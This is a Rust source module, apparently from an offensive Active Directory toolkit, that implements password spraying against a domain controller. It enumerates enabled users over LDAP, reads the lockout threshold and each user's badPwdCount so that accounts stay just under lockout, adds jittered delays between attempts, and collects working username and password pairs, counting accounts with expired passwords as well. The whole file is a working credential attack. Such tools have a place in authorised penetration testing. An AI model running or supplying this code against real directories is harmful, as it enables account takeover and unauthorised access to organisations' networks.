//! Password Spraying — lockout-safe horizontal credential attack.
//!
//! Tries each password against every user in one "round" before moving to the
//! next password.  Before each attempt the module checks the domain lockout
//! policy (via LDAP) and the individual `badPwdCount` so it stays at least
//! `safe_threshold` attempts below the lockout threshold.
//!
//! Bind attempts are made via raw `ldap3::LdapConnAsync::simple_bind` so
//! that they go directly to the DC without reusing the operator LDAP session
//! (avoiding false "invalid credential" errors from session state).

use crate::runner::HuntConfig;
use ldap3::{LdapConnAsync, drive, ldap_escape};
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::ldap as ldap_proto;
use serde::{Deserialize, Serialize};
use tracing::{debug, info, warn};

// ─────────────────────────────────────────────────────────────
// Constants
// ─────────────────────────────────────────────────────────────

/// LDAP result code for "invalid credentials" (includes AD sub-errors)
const LDAP_INVALID_CREDENTIALS: u32 = 49;

// AD diagnostic message sub-codes (decimal, appear as "data NNNN,")
const DIAG_LOCKED: &str = "775";
const DIAG_DISABLED: &str = "533";
const DIAG_EXPIRED: &str = "532";

// ─────────────────────────────────────────────────────────────
// Configuration
// ─────────────────────────────────────────────────────────────

/// Configuration for a password spray run.
#[derive(Debug, Clone)]
pub struct SprayConfig {
    /// Passwords to try — one horizontal round per password.
    pub passwords: Vec<String>,
    /// Explicit username list to spray.  If empty, enumerate from LDAP.
    pub usernames: Vec<String>,
    /// Minimum delay between bind attempts (ms).
    pub delay_ms: u64,
    /// Upper bound of random jitter added to `delay_ms` (ms).
    pub jitter_ms: u64,
    /// Abort the entire spray if any account becomes locked out.
    pub stop_on_lockout: bool,
    /// Stay at least this many attempts below the lockout threshold.
    pub safe_threshold: u32,
    /// Query the domain lockout policy before spraying.
    pub check_policy: bool,
}

impl Default for SprayConfig {
    fn default() -> Self {
        Self {
            passwords: Vec::new(),
            usernames: Vec::new(),
            delay_ms: 500,
            jitter_ms: 250,
            stop_on_lockout: true,
            safe_threshold: 2,
            check_policy: true,
        }
    }
}

// ─────────────────────────────────────────────────────────────
// Results
// ─────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SprayResult {
    /// `(username, password)` pairs for which the bind succeeded.
    pub valid_creds: Vec<(String, String)>,
    /// Users skipped because they were near the lockout threshold.
    pub skipped: Vec<String>,
    /// Users that locked out during the spray (reported by the DC).
    pub locked_out: Vec<String>,
    /// Total bind attempts made.
    pub attempts: usize,
}

impl SprayResult {
    fn new() -> Self {
        Self {
            valid_creds: Vec::new(),
            skipped: Vec::new(),
            locked_out: Vec::new(),
            attempts: 0,
        }
    }
}

// ─────────────────────────────────────────────────────────────
// Entry point
// ─────────────────────────────────────────────────────────────

/// Run a lockout-safe password spray against the configured DC.
pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayResult> {
    if spray.passwords.is_empty() {
        return Err(OverthroneError::Config(
            "Password spray: no passwords specified".to_string(),
        ));
    }

    let mut result = SprayResult::new();

    // Build username list
    let usernames: Vec<String> = if spray.usernames.is_empty() {
        info!("Spray: no usernames given — enumerating enabled users via LDAP...");
        collect_spray_targets(hunt).await?
    } else {
        spray.usernames.clone()
    };

    if usernames.is_empty() {
        warn!("Spray: no users to spray");
        return Ok(result);
    }

    // Fetch lockout threshold
    let lockout_threshold: u32 = if spray.check_policy {
        match query_lockout_threshold(hunt).await {
            Ok(0) => {
                info!("Spray: lockout policy is disabled (threshold=0) — spraying without limit");
                0
            }
            Ok(t) => {
                info!("Spray: domain lockout threshold = {t} bad attempts");
                t
            }
            Err(e) => {
                warn!("Spray: cannot read lockout policy ({e}) — treating threshold as 0");
                0
            }
        }
    } else {
        0
    };

    let safe_limit = if lockout_threshold == 0 {
        u32::MAX
    } else {
        lockout_threshold.saturating_sub(spray.safe_threshold)
    };

    let ldap_url = format!("ldap://{}:389", hunt.dc_ip);

    info!(
        "Spray: {} user(s) × {} password(s) | delay={}ms jitter={}ms",
        usernames.len(),
        spray.passwords.len(),
        spray.delay_ms,
        spray.jitter_ms,
    );

    // Horizontal spray: try each password against all users before moving on
    'outer: for password in &spray.passwords {
        info!("Spray: testing password '{password}'");

        for username in &usernames {
            // Skip already-flagged users
            if result.locked_out.contains(username) || result.skipped.contains(username) {
                continue;
            }

            // Per-user badPwdCount check (only when policy is enabled)
            if spray.check_policy && lockout_threshold > 0 {
                let bad = query_bad_pwd_count(hunt, username)
                    .await
                    .unwrap_or(0);
                if bad >= safe_limit {
                    warn!(
                        "Spray: skipping {username} (badPwdCount={bad} ≥ safe_limit={safe_limit})"
                    );
                    result.skipped.push(username.clone());
                    continue;
                }
            }

            // Apply delay + random jitter
            let jitter = if spray.jitter_ms > 0 {
                rand::random::<u64>() % spray.jitter_ms
            } else {
                0
            };
            tokio::time::sleep(tokio::time::Duration::from_millis(
                spray.delay_ms + jitter,
            ))
            .await;

            // Bind attempt
            result.attempts += 1;
            let upn = format!("{}@{}", username, hunt.domain);
            match attempt_ldap_bind(&ldap_url, &upn, password).await {
                BindOutcome::Success => {
                    info!("Spray: ✓ VALID  → {}:{}", username, password);
                    result
                        .valid_creds
                        .push((username.clone(), password.clone()));
                }
                BindOutcome::InvalidCredentials => {
                    debug!("Spray: {username} — wrong password");
                }
                BindOutcome::AccountLocked => {
                    warn!("Spray: {username} is LOCKED OUT");
                    result.locked_out.push(username.clone());
                    if spray.stop_on_lockout {
                        warn!("Spray: aborting — stop_on_lockout is set");
                        break 'outer;
                    }
                }
                BindOutcome::AccountDisabled => {
                    debug!("Spray: {username} — disabled, skipping for remainder");
                    result.skipped.push(username.clone());
                }
                BindOutcome::PasswordExpired => {
                    // Wrong-password-that-expired still means the account exists
                    // and the cred might be useful for other attacks
                    info!(
                        "Spray: {username} — password expired (recording as valid candidate)"
                    );
                    result
                        .valid_creds
                        .push((username.clone(), password.clone()));
                }
                BindOutcome::Error(e) => {
                    debug!("Spray: {username} — bind error: {e}");
                }
            }
        }
    }

    info!(
        "Spray complete — valid={} skipped={} locked={} attempts={}",
        result.valid_creds.len(),
        result.skipped.len(),
        result.locked_out.len(),
        result.attempts,
    );
    Ok(result)
}

// ─────────────────────────────────────────────────────────────
// Internal helpers
// ─────────────────────────────────────────────────────────────

/// Classification of a single LDAP bind attempt.
enum BindOutcome {
    Success,
    InvalidCredentials,
    AccountLocked,
    AccountDisabled,
    PasswordExpired,
    Error(String),
}

/// Perform one LDAP simple bind and classify the result.
///
/// Opens a fresh connection each time so individual spray failures do not
/// contaminate the operator's LDAP session.
async fn attempt_ldap_bind(ldap_url: &str, upn: &str, password: &str) -> BindOutcome {
    let (conn, mut ldap) = match LdapConnAsync::new(ldap_url).await {
        Ok(pair) => pair,
        Err(e) => return BindOutcome::Error(format!("connect: {e}")),
    };
    drive!(conn);

    let res = ldap.simple_bind(upn, password).await;
    let _ = ldap.unbind().await;

    match res {
        Err(e) => BindOutcome::Error(e.to_string()),
        Ok(r) if r.rc == 0 => BindOutcome::Success,
        Ok(r) if r.rc == LDAP_INVALID_CREDENTIALS => {
            // Active Directory embeds sub-error codes in the diagnostic text:
            // "80090308: LdapErr: ..., data 775, ..." (locked)
            // "80090308: LdapErr: ..., data 533, ..." (disabled)
            // "80090308: LdapErr: ..., data 532, ..." (expired)
            let text = &r.text;
            if text.contains(DIAG_LOCKED) {
                BindOutcome::AccountLocked
            } else if text.contains(DIAG_DISABLED) {
                BindOutcome::AccountDisabled
            } else if text.contains(DIAG_EXPIRED) {
                BindOutcome::PasswordExpired
            } else {
                BindOutcome::InvalidCredentials
            }
        }
        Ok(r) => BindOutcome::Error(format!("ldap rc={} {}", r.rc, r.text)),
    }
}

/// Open an operator LDAP session (respects `use_hash`).
async fn open_operator_ldap(hunt: &HuntConfig) -> Result<ldap_proto::LdapSession> {
    if hunt.use_hash {
        ldap_proto::LdapSession::connect_with_hash(
            &hunt.dc_ip,
            &hunt.domain,
            &hunt.username,
            &hunt.secret,
            false,
        )
        .await
    } else {
        ldap_proto::LdapSession::connect(
            &hunt.dc_ip,
            &hunt.domain,
            &hunt.username,
            &hunt.secret,
            false,
        )
        .await
    }
}

/// Return enabled, non-machine-account `sAMAccountName`s from the domain.
async fn collect_spray_targets(hunt: &HuntConfig) -> Result<Vec<String>> {
    let mut ldap = open_operator_ldap(hunt).await?;
    let users = ldap.enumerate_users().await?;
    let names: Vec<String> = users
        .into_iter()
        .filter(|u| u.enabled && !u.sam_account_name.ends_with('$'))
        .map(|u| u.sam_account_name)
        .collect();
    info!("Spray: {} spray target(s) enumerated", names.len());
    Ok(names)
}

/// Query the `lockoutThreshold` attribute from the domain NC root object.
async fn query_lockout_threshold(hunt: &HuntConfig) -> Result<u32> {
    let mut ldap = open_operator_ldap(hunt).await?;
    let base_dn = hunt.derive_base_dn();
    let entries = ldap
        .custom_search_with_base(
            &base_dn,
            "(objectClass=domainDNS)",
            &["lockoutThreshold"],
        )
        .await?;
    let threshold = entries
        .first()
        .and_then(|e| e.attrs.get("lockoutThreshold"))
        .and_then(|v| v.first())
        .and_then(|s| s.parse::<u32>().ok())
        .unwrap_or(0);
    Ok(threshold)
}

/// Query `badPwdCount` for a specific user using the operator LDAP session.
async fn query_bad_pwd_count(hunt: &HuntConfig, username: &str) -> Result<u32> {
    let mut ldap = open_operator_ldap(hunt).await?;
    let base_dn = hunt.derive_base_dn();
    let filter = format!("(sAMAccountName={})", ldap_escape(username));
    let entries = ldap
        .custom_search_with_base(&base_dn, &filter, &["badPwdCount"])
        .await?;
    let count = entries
        .first()
        .and_then(|e| e.attrs.get("badPwdCount"))
        .and_then(|v| v.first())
        .and_then(|s| s.parse::<u32>().ok())
        .unwrap_or(0);
    Ok(count)
}
